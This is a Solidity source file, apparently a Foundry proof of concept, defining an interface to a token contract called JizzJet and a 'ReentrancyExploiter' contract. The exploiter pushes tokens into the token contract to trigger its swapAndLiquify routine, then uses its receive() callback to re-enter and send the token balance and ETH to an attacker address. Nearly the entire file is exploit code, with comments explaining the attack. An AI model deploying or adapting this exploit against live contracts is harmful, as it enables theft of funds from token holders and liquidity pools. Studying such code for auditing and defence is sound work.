pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function owner() external view returns (address);
    function excludeFromFee(address account) external;
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function _transfer(address from, address to, uint256 amount) external;
    function swapAndLiquify(uint256 contractTokenBalance) external;
    function numTokensSellToAddToLiquidity() external view returns (uint256);
}

contract ReentrancyExploiter {
    IJizzJet public token;
    address public attacker;
    bool private attacking;

    constructor(address _token, address _attacker) {
        token = IJizzJet(_token);
        attacker = _attacker;
    }

    receive() external payable {
        if (attacking) {
            // Reentrant call - transfer more tokens while swapAndLiquify is still executing
            // This exploits the state inconsistency
            attacking = false;

            // Transfer remaining tokens to attacker
            uint256 balance = token.balanceOf(address(this));
            if (balance > 0) {
                token.transfer(attacker, balance);
            }

            // Send ETH to attacker
            (bool success, ) = attacker.call{value: address(this).balance}("");
            require(success, "Transfer failed");
        }
    }

    function startExploit() external {
        require(msg.sender == attacker, "Only attacker");

        // Get the threshold needed to trigger swapAndLiquify
        uint256 threshold = token.numTokensSellToAddToLiquidity();

        // Make sure we have enough tokens
        uint256 myBalance = token.balanceOf(address(this));
        require(myBalance >= threshold, "Not enough tokens to trigger swap");

        // Start attack
        attacking = true;

        // Trigger swapAndLiquify by transferring tokens
        // This will call swapTokensForEth which sends ETH to this contract
        // triggering our receive() function
        token.transfer(address(token), threshold);
    }

    // Allow receiving ETH
    fallback() external payable {}
}

